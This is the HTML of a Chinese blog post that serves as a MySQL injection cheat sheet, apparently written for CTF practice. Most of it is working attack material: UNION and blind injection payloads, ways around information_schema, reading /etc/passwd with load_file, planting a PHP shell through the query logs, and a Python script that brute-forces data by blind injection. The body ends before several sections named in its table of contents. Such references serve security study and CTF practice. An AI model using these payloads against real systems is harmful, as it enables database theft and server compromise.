@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/mysql/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/mysql/","path":"2023/12/25/mysql/","title":"mysql注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>mysql注入 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="nav-text">常见函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="nav-text">查看当前数据库版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7"><span class="nav-text">当前登录用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E4%BD%BF%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">当前使用的数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-text">当前的操作系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E7%9B%B8%E5%85%B3"><span class="nav-text">路径相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97%E7%9B%B8%E5%85%B3"><span class="nav-text">字母&#x2F;数字相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96"><span class="nav-text">字符串截取</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E8%AF%AD%E5%8F%A5"><span class="nav-text">常规语句</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87information-schema"><span class="nav-text">绕过information_schema</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-text">读写文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="nav-text">日志写shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5"><span class="nav-text">变量注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="nav-text">异或注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="nav-text">order by盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-text">无列名注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%97%E5%90%8D%E9%87%8D%E5%A4%8D%EF%BC%88join%E2%80%A6using%EF%BC%89"><span class="nav-text">列名重复（join…using）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%88%AB%E5%90%8D%EF%BC%8C%E5%BC%95%E7%94%A8%E5%88%97%E5%90%8D%EF%BC%88%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8union%EF%BC%89"><span class="nav-text">通过别名，引用列名（需要使用union）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AF%94%E8%BE%83%E7%9B%B2%E6%B3%A8"><span class="nav-text">比较盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E7%A7%8D%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-text">五种延时注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REGEXP%E7%9B%B2%E6%B3%A8"><span class="nav-text">REGEXP盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-text">延时注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/mysql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="mysql注入 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mysql注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%80%9F%E6%9F%A5/" itemprop="url" rel="index"><span itemprop="name">速查</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本地：mysql5.7</p>
+<a id="more"></a>
+
+<h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h2><ul>
+<li>VERSION()</li>
+<li>@@VERSION</li>
+<li>@@GLOBAL.VERSION</li>
+</ul>
+<h2 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h2><ul>
+<li>user()</li>
+<li>current_user()</li>
+<li>system_user()</li>
+<li>session_user()</li>
+</ul>
+<h2 id="当前使用的数据库"><a href="#当前使用的数据库" class="headerlink" title="当前使用的数据库"></a>当前使用的数据库</h2><ul>
+<li>database()</li>
+<li>schema()</li>
+</ul>
+<h2 id="当前的操作系统"><a href="#当前的操作系统" class="headerlink" title="当前的操作系统"></a>当前的操作系统</h2><ul>
+<li>@@version_compile_os</li>
+</ul>
+<h2 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h2><ul>
+<li>@@basedir : mysql安装路径</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li>
+<li>@@DATADIR : 数据存储路径</li>
+<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>
+<li>@@LOG_ERROR : 错误日志文件路径：</li>
+<li>@@PID_FILE : pid-file文件路径</li>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li>
+</ul>
+<h2 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母/数字相关"></a>字母/数字相关</h2><ul>
+<li>ASCII(): 获取字母的ascii码值</li>
+<li>BIN(): 返回值的二进制串表示</li>
+<li>CONV(): 进制转换</li>
+<li>FLOOR(): 函数只返回整数部分，小数部分舍弃。</li>
+<li>ROUND(): 函数四舍五入，大于0.5的部分进位，不到则舍弃。</li>
+<li>LOWER()：转成小写字母</li>
+<li>UPPER(): 转成大写字母</li>
+<li>HEX():十六进制编码</li>
+<li>UNHEX()：十六进制解码</li>
+</ul>
+<h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><ul>
+<li>MID(column_name,start[,length]) start起始为1</li>
+<li>LEFT(str,length) length为从左边开始要返回的字符数</li>
+<li>RIGHT(str,length). length为从右边开始要返回的字符数</li>
+<li>SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值</li>
+<li>SUBSTRING(str,pos,len). 与subsets()相同</li>
+</ul>
+<h1 id="常规语句"><a href="#常规语句" class="headerlink" title="常规语句"></a>常规语句</h1><p>查询全部数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemeta limit 0,10</span><br></pre></td></tr></table></figure>
+
+
+<p>查询指定表名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;  &#x2F;&#x2F;可用十六进制</span><br></pre></td></tr></table></figure>
+
+
+<p>查询指定列名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39; and table_schema&#x3D;&#39;sqli&#39;</span><br></pre></td></tr></table></figure>
+
+<p>获取指定数据:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select flag from flag</span><br><span class="line">select username,password from sqli.user (垮库查询)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="绕过information-schema"><a href="#绕过information-schema" class="headerlink" title="绕过information_schema"></a>绕过information_schema</h1><p>一、利用mysql5.7新增的sys.schema_auto_increment_columns</p>
+<p>sys.schema_auto_increment_columns</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235209264.png" alt="image-20230102235209264"></p>
+<p>二、mysql默认存储引擎innoDB携带的表</p>
+<p> mysql.innodb_table_stats</p>
+<p> mysql.innodb_index_stats</p>
+<p> 两表均有database_name和table_name字段，可以利用</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235456704.png" alt="image-20230102235456704"></p>
+<p>三、sys数据库</p>
+<table>
+<thead>
+<tr>
+<th align="center">表单或视图</th>
+<th align="center">存储数据库名字段</th>
+<th align="center">存储表单名字段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">sys.innodb_buffer_stats_by_table</td>
+<td align="center">object_schema</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">sys.x$innodb_buffer_stats_by_table</td>
+<td align="center">object_schema</td>
+<td align="center">object_name</td>
+</tr>
+<tr>
+<td align="center">sys.schema_auto_increment_columns</td>
+<td align="center">table_schema</td>
+<td align="center">table_name</td>
+</tr>
+<tr>
+<td align="center">sys.schema_table_statistics</td>
+<td align="center"></td>
+<td align="center">table_schema</td>
+</tr>
+<tr>
+<td align="center">sys.x$schema_table_statistics</td>
+<td align="center">table_schema</td>
+<td align="center">table_name</td>
+</tr>
+<tr>
+<td align="center">sys.schema_table_statistics_with_buffer</td>
+<td align="center">table_schema</td>
+<td align="center">table_name</td>
+</tr>
+<tr>
+<td align="center">sys.x$schema_table_statistics_with_buffer</td>
+<td align="center">table_schema</td>
+<td align="center">table_name</td>
+</tr>
+<tr>
+<td align="center">sys.schema_tables_with_full_table_scans</td>
+<td align="center">object_schema</td>
+<td align="center">object_name</td>
+</tr>
+<tr>
+<td align="center">sys.x$schema_tables_with_full_table_scans</td>
+<td align="center">object_schema</td>
+<td align="center">object_name</td>
+</tr>
+<tr>
+<td align="center">sys.io_global_by_file_by_latency</td>
+<td align="center">file字段包含数据名和表单名</td>
+<td align="center">file字段包含数据名和表单名</td>
+</tr>
+<tr>
+<td align="center">sys.x$io_global_by_file_by_latency</td>
+<td align="center">file字段包含数据名和表单名</td>
+<td align="center">file字段包含数据名和表单名</td>
+</tr>
+<tr>
+<td align="center">sys.io_global_by_file_by_bytes</td>
+<td align="center">file字段包含数据名和表单名</td>
+<td align="center">file字段包含数据名和表单名</td>
+</tr>
+<tr>
+<td align="center">sys.x$io_global_by_file_by_bytes</td>
+<td align="center">file字段包含数据名和表单名</td>
+<td align="center">file字段包含数据名和表单名</td>
+</tr>
+<tr>
+<td align="center">sys.x$schema_flattened_keys</td>
+<td align="center">table_schema</td>
+<td align="center">table_name</td>
+</tr>
+<tr>
+<td align="center">sys.x$ps_schema_table_statistics_io</td>
+<td align="center">table_schema</td>
+<td align="center">table_name</td>
+</tr>
+<tr>
+<td align="center">performance_schema.objects_summary_global_by_type</td>
+<td align="center">object_schema</td>
+<td align="center">object_name</td>
+</tr>
+<tr>
+<td align="center">performance_schema.table_handles</td>
+<td align="center"></td>
+<td align="center">object_schema</td>
+</tr>
+<tr>
+<td align="center">performance_schema.table_io_waits_summary_by_index_usage</td>
+<td align="center">object_schema</td>
+<td align="center">object_name</td>
+</tr>
+<tr>
+<td align="center">performance_schema.table_io_waits_summary_by_table</td>
+<td align="center">object_schema</td>
+<td align="center">object_name</td>
+</tr>
+</tbody></table>
+<p>还有一些存储报错语句的和执行状态的表单或视图得知其中含有的数据库名和表单信息，通过获取query可以查看之前用到的查询语句。</p>
+<table>
+<thead>
+<tr>
+<th align="center">视图</th>
+<th align="center">字段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">sys.statements_with_errors_or_warnings</td>
+<td align="center">query</td>
+</tr>
+<tr>
+<td align="center">sys.statements_with_full_table_scans</td>
+<td align="center">query</td>
+</tr>
+<tr>
+<td align="center">sys.statement_analysis</td>
+<td align="center">query</td>
+</tr>
+<tr>
+<td align="center">sys.x$statement_analysis</td>
+<td align="center">query</td>
+</tr>
+<tr>
+<td align="center">performance_schema.events_statements_summary_by_digest</td>
+<td align="center">digest_text(查询记录)</td>
+</tr>
+<tr>
+<td align="center">performance_schema.file_instances</td>
+<td align="center">file_name(文件路径)</td>
+</tr>
+</tbody></table>
+<h1 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h1><p>条件：</p>
+<ul>
+<li><p>数据库允许导入导出（secure_file_priv）</p>
+</li>
+<li><p>当前用户用户文件操作权限（File_priv），尽量具有root权限</p>
+</li>
+<li><p>知道绝对物理路径</p>
+</li>
+</ul>
+<p>查看权限配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host&#x3D;&#39;localhost&#39;</span><br><span class="line">show global variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>secure_file_priv 参数用来限制数据导入和导出操作的效果</p>
+<ul>
+<li>secure_file_prive=null ;限制mysqld 不允许导入和导出</li>
+<li>secure_file_priv=/tmp/ ;限制mysqld 的导入和导出只能在/tmp/目录下</li>
+<li>secure_file_priv=’’ ;不对mysqld 的导入和导出做限制</li>
+</ul>
+<blockquote>
+<p>mysql 5.6.34版本以后，配置文件默认没有secure_file_priv这个选项，实际为NULL。并且无法用sql语句对其进行修改，只能够通过修改以下文件。</p>
+<p>windows下 my.ini<br>[mysqld]<br>secure_file_priv=</p>
+<p>linux下 cat /etc/my.cnf<br>[mysqld]<br>secure_file_priv=</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;); 可使用hex绕过引号</span><br><span class="line">select &#39;test&#39; into outfile &#39;&#x2F;tmp&#x2F;demo.txt&#39;;</span><br><span class="line">select &#39;test&#39; into dumpfile &#39;&#x2F;tmp&#x2F;demo.txt&#39;</span><br></pre></td></tr></table></figure>
+
+<p>dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>
+<h1 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h1><p><strong>突破secure_file_priv 选项限制</strong>，通过日志文件，原理都是修改日志存放的路径及文件，通过执行操作把木马存入修改后的日志中，达到写入木马的目的。</p>
+<p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志、二进制日志，只有查询日志和慢查询日志可利用。</p>
+<p>查看日志状态（默认禁止）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;general_log%&#39;;       查询日志</span><br><span class="line">show variables like &#39;%slow_query_log%&#39;;   慢查询日志</span><br></pre></td></tr></table></figure>
+
+<p>开启日志记录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &#39;ON&#39;;   查询日志</span><br><span class="line">set global slow_query_log&#x3D;1;     慢查询日志</span><br></pre></td></tr></table></figure>
+
+<p>伪造(修改)日志文件的绝对路径以及文件名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;test.php&quot;;    查询日志</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;&#x2F;tmp&#x2F;test.php’; 慢查询日志</span><br></pre></td></tr></table></figure>
+
+<p>执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo() ?&gt;&#39;;                 查询日志</span><br><span class="line">select &#39;&lt;?php phpinfo() ?&gt;&#39; or sleep(11);    慢查询日志</span><br></pre></td></tr></table></figure>
+
+<p>关于慢查询日志</p>
+<p>命令执行时间超过long_query_time设定的值(默认10s)，则会保存至慢查询日志。查看long_query_time设定的值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;%long_query_time%&#39;;   </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="变量注入"><a href="#变量注入" class="headerlink" title="变量注入"></a>变量注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user limit 0,1 into @a,@b,@c;</span><br><span class="line">select * from user where username&#x3D;&#39;&#39; union select @a,@b,@c;</span><br><span class="line"></span><br><span class="line">搭配写文件</span><br><span class="line">select count(*) from user where id &#x3D;&#39;1&#39; union select * from(select &#39;shell&#39;)a limit 1,1 into @a;</span><br><span class="line">select @a into outfile &#39;&#x2F;tmp&#x2F;flag.txt&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;s&#39;)^1;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where id&#x3D;&#39;1&#39; union select 1,2,binary(&#39;E&#39;) order by 3</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | Dump     | Dump                             |</span><br><span class="line">|  1 | 2        | E                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">select * from user where id&#x3D;&#39;1&#39; union select 1,2,binary(&#39;D&#39;) order by 3</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | D                                |</span><br><span class="line">|  1 | Dump     | Dump                             |</span><br><span class="line">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p><a target="_blank" rel="noopener" href="https://k1te.cn/2021/05/19/no-column-sql-injection/">ctf无列名注入小结 </a></p>
+<h2 id="列名重复（join…using）"><a href="#列名重复（join…using）" class="headerlink" title="列名重复（join…using）"></a>列名重复（join…using）</h2><p>条件：需要开启报错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where username&#x3D;&#39;1&#39; union select * from (select * from user a join user b)c   &#x2F;&#x2F;dump出第一个字段名：</span><br><span class="line">&gt; 1060 - Duplicate column name &#39;id&#39;</span><br><span class="line"></span><br><span class="line">select * from user where username&#x3D;&#39;1&#39; union select * from (select * from user a join user b using(id))c   &#x2F;&#x2F;dump出第二个字段名：</span><br><span class="line">&gt; 1060 - Duplicate column name &#39;username&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过别名，引用列名（需要使用union）"><a href="#通过别名，引用列名（需要使用union）" class="headerlink" title="通过别名，引用列名（需要使用union）"></a>通过别名，引用列名（需要使用union）</h2><p>条件：有查询内容回显</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(&#96;2&#96;) from (select 1,2,3 union select * from user)c</span><br><span class="line"></span><br><span class="line">反引号禁用时，使用别名 as 绕过或者双引号：</span><br><span class="line">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(a) from (select 1,2,3 as a union select * from user)c</span><br><span class="line">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(a) from (select 1,2,3 a union select * from user)c</span><br><span class="line">select * from user where username&#x3D;&#39;-1&#39; union select 1,1,group_concat(a) from (select 1,2,&quot;a&quot; union select * from user)c</span><br></pre></td></tr></table></figure>
+
+<h2 id="比较盲注"><a href="#比较盲注" class="headerlink" title="比较盲注"></a>比较盲注</h2><p>条件：盲注条件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ((select &quot;f&quot;)&gt;(select &quot;flag&#123;xxxx&#125;&quot;));</span><br><span class="line">&gt; 0</span><br><span class="line">select ((select &quot;fm&quot;)&gt;(select &quot;flag&#123;xxxx&#125;&quot;));</span><br><span class="line">&gt; 1</span><br><span class="line">select ((select 1,&quot;fm&quot;)&gt;(select * from flag));</span><br><span class="line">&gt; 1</span><br></pre></td></tr></table></figure>
+
+<p>塞个脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def add(flag):</span><br><span class="line">    res&#x3D;&#39;&#39;</span><br><span class="line">    res +&#x3D; flag</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;&quot;&quot;1^((select 1,&quot;&#123;&#125;&quot;) &gt; (select * from f1ag_1s_h3r3_hhhhh ))^1&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;url&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,80):</span><br><span class="line">    for j in range(32,140):</span><br><span class="line">        mixchar &#x3D; add(flag+chr(j))</span><br><span class="line">        py &#x3D; payload.format(mixchar)</span><br><span class="line">        data &#x3D; &#123;&quot;id&quot;: py&#125;</span><br><span class="line">        r &#x3D; requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">        if &#39;Nu1L&#39; in r.text:</span><br><span class="line">            flag &#x3D; flag+chr(j-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+
+
